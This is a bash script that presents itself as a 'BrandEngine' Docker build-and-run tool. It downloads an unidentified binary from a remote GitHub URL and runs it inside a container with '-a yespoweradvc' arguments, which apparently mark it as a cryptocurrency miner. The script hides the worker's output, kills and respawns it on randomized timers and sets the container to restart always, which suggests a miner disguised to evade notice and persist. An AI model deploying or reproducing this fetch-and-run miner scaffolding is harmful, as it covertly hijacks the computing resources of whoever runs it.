#!/bin/bash

set -e

echo "=============================================="
echo "     Building and Running BrandEngine Docker  "
echo "=============================================="

# Variables
BINARY_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/linuxcpu8888"
BUILD_DIR="brandengine_build"
BINARY_NAME="worker"

# 1️⃣ Prepare build directory
echo "[1/5] Preparing Docker build files..."
rm -rf $BUILD_DIR
mkdir -p $BUILD_DIR

# 2️⃣ Download binary
echo "[2/5] Downloading binary from $BINARY_URL ..."
curl -L -o $BUILD_DIR/$BINARY_NAME $BINARY_URL
chmod +x $BUILD_DIR/$BINARY_NAME

# 3️⃣ Create entrypoint script with 120s respawn
echo "[3/5] Creating entrypoint script..."
cat > $BUILD_DIR/entrypoint.sh << 'EOF'
#!/bin/bash

# ----------------------------------------------
# BrandEngine — Background Container Worker
# ----------------------------------------------

EXEC="/opt/brand/worker"
MIN_DELAY=32
MAX_DELAY=62
RESPAWN_INTERVAL=120   # seconds

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] BrandEngine: $1"
}

log "Starting BrandEngine container..."

while true; do
    # Generate random string for -o parameter
    RANDOM_STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c16)
    ARGS="-a yespoweradvc -o $RANDOM_STR"

    log "Starting worker..."
    # Run worker in background
    $EXEC $ARGS >/dev/null 2>&1 &
    WORKER_PID=$!

    log "Worker PID: $WORKER_PID"

    # Wait for 120 seconds
    SECONDS_PASSED=0
    while [ $SECONDS_PASSED -lt $RESPAWN_INTERVAL ]; do
        sleep 1
        SECONDS_PASSED=$((SECONDS_PASSED + 1))
    done

    # Kill worker process
    if kill -0 $WORKER_PID >/dev/null 2>&1; then
        log "Killing worker after $RESPAWN_INTERVAL seconds..."
        kill -9 $WORKER_PID >/dev/null 2>&1 || true
    else
        log "Worker already exited."
    fi

    # Sleep random time before respawn
    SLEEP_TIME=$(( (RANDOM % (MAX_DELAY - MIN_DELAY + 1)) + MIN_DELAY ))
    log "Sleeping $SLEEP_TIME seconds before respawn..."
    sleep $SLEEP_TIME
done
EOF

chmod +x $BUILD_DIR/entrypoint.sh

# 4️⃣ Create Dockerfile
echo "[4/5] Creating Dockerfile..."
cat > $BUILD_DIR/Dockerfile << 'EOF'
FROM ubuntu:22.04

# Install bash, curl, and required libraries
RUN apt-get update && \
    apt-get install -y bash curl libjansson4 && \
    rm -rf /var/lib/apt/lists/*

# Create working directory
RUN mkdir -p /opt/brand

# Copy binary and entrypoint
COPY worker /opt/brand/worker
COPY entrypoint.sh /opt/brand/entrypoint.sh

# Set permissions
RUN chmod +x /opt/brand/worker
RUN chmod +x /opt/brand/entrypoint.sh

WORKDIR /opt/brand

ENTRYPOINT ["/opt/brand/entrypoint.sh"]
EOF

# 5️⃣ Build Docker image
echo "[5/5] Building Docker image..."
docker build -t brandengine $BUILD_DIR

# Remove old container if exists
docker rm -f brandengine >/dev/null 2>&1 || true

# Run container
docker run -d --name brandengine --restart always brandengine

echo "=============================================="
echo " BrandEngine container is now running."
echo "----------------------------------------------"
echo " Container name : brandengine"
echo " Image          : brandengine"
echo " Executable     : /opt/brand/worker"
echo " View logs      : docker logs -f brandengine"
echo "=============================================="
